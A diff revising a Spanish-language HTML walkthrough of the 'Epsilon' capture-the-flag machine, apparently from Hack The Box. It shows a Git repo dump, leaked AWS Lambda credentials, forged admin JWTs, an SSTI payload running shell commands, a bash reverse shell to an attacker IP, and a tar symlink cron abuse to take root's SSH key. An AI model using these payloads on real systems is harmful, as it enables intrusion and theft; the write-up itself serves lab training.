@@ -1,9 +1,7 @@
 <h2>Overview</h2>
-<p>
-Epsilon es una máquina Linux de dificultad media que expone un repositorio Git en el servidor web. Durante la enumeración se descubren credenciales de AWS Lambda filtradas en los commits de Git, lo que permite obtener la clave secreta utilizada para firmar JWT en la aplicación Flask. Con esta clave podemos falsificar cookies de administrador y acceder a rutas protegidas. Finalmente, se escala a root abusando de un cronjob que ejecuta <code>tar</code> con la opción <code>-h</code>, lo que permite reemplazar archivos críticos mediante enlaces simbólicos.
-</p>
+<p>Epsilon es una máquina Linux de dificultad media que expone un repositorio Git en el servidor web. Durante la enumeración se descubren credenciales de AWS Lambda filtradas en los commits de Git, lo que permite obtener la clave secreta utilizada para firmar JWT en la aplicación Flask. Con esta clave podemos falsificar cookies de administrador y acceder a rutas protegidas. Finalmente, se escala a root abusando de un cronjob que ejecuta <code>tar</code> con la opción <code>-h</code>, lo que permite reemplazar archivos críticos mediante enlaces simbólicos.</p>
 
-<h2>Key Steps</h2>
+<h2>Key steps</h2>
 <ol>
   <li>Escaneo y enumeración de puertos con <code>nmap</code>.</li>
   <li>Enumeración de la aplicación web y volcado del repositorio Git.</li>
@@ -14,52 +12,50 @@ Epsilon es una máquina Linux de dificultad media que expone un repositorio Git 
 </ol>
 
 <h3>1. Enumeración de puertos</h3>
-<p>
-Se realiza un escaneo completo de todos los puertos TCP abiertos para identificar servicios activos:
-</p>
+<p>El primer paso es identificar qué servicios están expuestos en la máquina objetivo. Usamos <code>nmap</code> para un escaneo completo de todos los puertos TCP.</p>
+
 <pre><code>nmap -p- --open -sT --min-rate 5000 -vvv -n -Pn 10.10.10.134</code></pre>
 
-<p>Explicación de los flags:</p>
+<p><strong>Explicación de los flags:</strong></p>
 <ul>
   <li><code>-p-</code>: Escanea todos los 65535 puertos.</li>
   <li><code>--open</code>: Solo muestra los puertos abiertos.</li>
-  <li><code>-sT</code>: Escaneo TCP completo.</li>
+  <li><code>-sT</code>: Escaneo TCP completo (no stealth, conecta directamente).</li>
   <li><code>--min-rate 5000</code>: Envía al menos 5000 paquetes por segundo para acelerar el escaneo.</li>
-  <li><code>-vvv</code>: Máxima verbosidad.</li>
-  <li><code>-n</code>: Evita resolución DNS.</li>
-  <li><code>-Pn</code>: No realiza ping antes de escanear.</li>
+  <li><code>-vvv</code>: Verbosidad máxima, muestra el progreso y detalles.</li>
+  <li><code>-n</code>: Evita resolución de DNS para acelerar.</li>
+  <li><code>-Pn</code>: No hace ping antes del escaneo (útil para firewalls que bloquean ICMP).</li>
 </ul>
 
-<p>Resultados:</p>
+<p><strong>Resultados:</strong></p>
 <pre><code>22/tcp   open  ssh
 80/tcp   open  http
 5000/tcp open  http</code></pre>
 
-<p>Observamos SSH, HTTP estándar y un servidor adicional en 5000.</p>
+<p>Interpretación: Hay un servidor SSH (posible acceso remoto), un sitio web público en el puerto 80, y otro servidor HTTP adicional en el puerto 5000 (posiblemente una aplicación web interna o API).</p>
 
 <h3>2. Enumeración HTTP y volcado del repositorio Git</h3>
-<p>
-Se analiza el puerto 80. Al abrir el sitio se recibe <code>403 Forbidden</code>, pero sospechamos que <code>/.git</code> está expuesto. Usamos <code>gitdumper</code> para volcar el repositorio:
-</p>
+<p>Al visitar <code>http://10.10.10.134</code> se obtiene un código 403, indicando que el acceso directo está prohibido. Sin embargo, podemos revisar si existe un repositorio Git expuesto en <code>/.git</code>. Para esto, usamos <code>gitdumper</code>:</p>
+
 <pre><code>./gitdumper.sh http://10.10.10.134/.git/ ~/CTF/Epsilon/loot/epsilon-repo</code></pre>
 
-<p>Archivos importantes encontrados:</p>
+<p>Esto nos permite obtener todo el historial de commits, archivos y credenciales que hayan sido expuestos accidentalmente.</p>
+
+<p><strong>Archivos importantes encontrados:</strong></p>
 <ul>
-  <li><code>server.py</code>: Lógica de autenticación con JWT.</li>
-  <li><code>track_api_CR_148.py</code>: Credenciales de AWS Lambda y lógica de funciones.</li>
+  <li><code>server.py</code>: Contiene la lógica de autenticación de la aplicación Flask y uso de JWT.</li>
+  <li><code>track_api_CR_148.py</code>: Contiene credenciales de AWS Lambda y lógica de conexión con la nube.</li>
 </ul>
 
 <h4>track_api_CR_148.py</h4>
-<p>En los commits históricos se encontraron credenciales codificadas:</p>
 <pre><code>aws_access_key_id='AQLA5M37BDN6FJP76TDC'
 aws_secret_access_key='OsK0o/glWwcjk2U3vVEowkvq5t4EiIreB+WdFo1A'
 region_name='us-east-1'
 endpoint_url='http://cloud.epsilong.htb'</code></pre>
 
-<p>Esto permite interactuar con la API Lambda usando AWS CLI.</p>
+<p>Estas credenciales permiten listar funciones Lambda y descargar su código.</p>
 
 <h4>server.py</h4>
-<p>Se define la ruta de login y la autenticación JWT:</p>
 <pre><code>secret = '&lt;secret_key&gt;'
 
 @app.route("/", methods=["GET","POST"])
@@ -67,17 +63,22 @@ def index():
     if request.method=="POST":
         if request.form['username']=="admin" and request.form['password']=="admin":
             res = make_response()
-            token = jwt.encode({"username":"admin"}, secret, algorithm="HS256")
-            res.set_cookie("auth", token)
+            token=jwt.encode({"username":"admin"},secret,algorithm="HS256")
+            res.set_cookie("auth",token)
             res.headers['location']='/home'
-            return res, 302</code></pre>
+            return res,302</code></pre>
 
-<p>Conocer la variable <code>secret</code> es crítico para falsificar cookies y acceder como administrador.</p>
+<p>Observamos que la aplicación utiliza JWT para la autenticación. Conocer la <code>secret</code> permite falsificar cookies y acceder como administrador.</p>
 
 <h3>3. Enumeración AWS Lambda</h3>
-<p>
-Configuramos AWS CLI con las credenciales extraídas y listamos las funciones Lambda activas:
-</p>
+<p>Configuramos AWS CLI usando las credenciales obtenidas:</p>
+
+<pre><code>aws configure
+# Ingresar aws_access_key_id y aws_secret_access_key
+# region: us-east-1</code></pre>
+
+<p>Listamos las funciones Lambda disponibles:</p>
+
 <pre><code>aws --endpoint-url=http://cloud.epsilon.htb/ lambda list-functions</code></pre>
 
 <pre><code>{
@@ -98,32 +99,38 @@ Configuramos AWS CLI con las credenciales extraídas y listamos las funciones La
 }</code></pre>
 
 <p>Descargamos el código de la función Lambda:</p>
+
 <pre><code>aws --endpoint-url=http://cloud.epsilon.htb/ lambda get-function --function-name costume_shop_v1
 wget http://cloud.epsilon.htb/path/to/code.zip
 unzip code.zip
 cat lambda_function.py</code></pre>
 
-<p>En este archivo se encuentra la clave secreta utilizada en la aplicación Flask.</p>
+<p>En este archivo se encuentra la <strong>clave secreta</strong> que usamos para firmar JWT.</p>
 
 <h3>4. Explotación y acceso inicial</h3>
 <p>Generamos un token JWT de administrador usando PyJWT:</p>
+
 <pre><code>import jwt
 secret = 'VALOR_EXTRAIDO_DEL_LAMBDA'
 token = jwt.encode({"username":"admin"}, secret, algorithm="HS256")
 print(token)</code></pre>
 
-<p>Se coloca en la cookie <code>auth</code> para acceder a rutas protegidas:</p>
+<p>Colocamos este token en la cookie <code>auth</code> para acceder a rutas administrativas:</p>
+
 <pre><code>curl -v --cookie "auth=GENERATED_JWT_TOKEN_HERE" http://10.10.10.134/home</code></pre>
 
 <h4>Explotación SSTI</h4>
-<p>En /order se detecta SSTI en campos de entrada evaluados por <code>render_template_string</code>. Payload de prueba:</p>
+<p>En la ruta <code>/order</code>, los campos de entrada son evaluados con <code>render_template_string</code>, permitiendo <strong>SSTI (Server Side Template Injection)</strong>. Probamos:</p>
+
 <pre><code>{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}</code></pre>
 
-<p>Obtenemos reverse shell:</p>
+<p>Si obtenemos salida del comando, confirmamos ejecución remota de comandos. Luego, lanzamos reverse shell:</p>
+
 <pre><code>bash -c "bash -i >& /dev/tcp/10.10.14.15/443 0>&1"</code></pre>
 
 <h3>5. Escalada de privilegios</h3>
-<p>Se detecta cronjob ejecutando <code>tar</code> en backups periódicos:</p>
+<p>Usamos <code>pspy</code> para enumerar cronjobs y descubrimos un backup periódico que ejecuta <code>tar</code> con opción <code>-h</code>:</p>
+
 <pre><code>#!/bin/bash
 file=`date +%N`
 /usr/bin/rm -rf /opt/backups/*
@@ -134,7 +141,8 @@ check_file=`date +%N`
 /usr/bin/tar -chvf "/var/backups/web_backups/${check_file}.tar" /opt/backups/checksum "/opt/backups/$file.tar"
 /usr/bin/rm -rf /opt/backups/*</code></pre>
 
-<p>Se abusa de la opción <code>-h</code> para crear un enlace simbólico apuntando a la clave privada de root:</p>
+<p>Se puede abusar de la opción <code>-h</code> de <code>tar</code> para reemplazar archivos críticos mediante enlaces simbólicos:</p>
+
 <pre><code>#!/bin/bash
 while true; do 
     if [ -e /opt/backups/checksum ]; then 
@@ -144,8 +152,9 @@ while true; do
     fi; 
 done</code></pre>
 
-<p>Una vez capturada la clave privada, nos conectamos vía SSH como root:</p>
+<p>Después, conectamos vía SSH como root:</p>
+
 <pre><code>ssh -i id_rsa root@10.10.10.134</code></pre>
 
-<p>Con esto se completa el acceso completo a la máquina Epsilon.</p>
+<p>Con esto se obtiene acceso completo a la máquina Epsilon.</p>
 
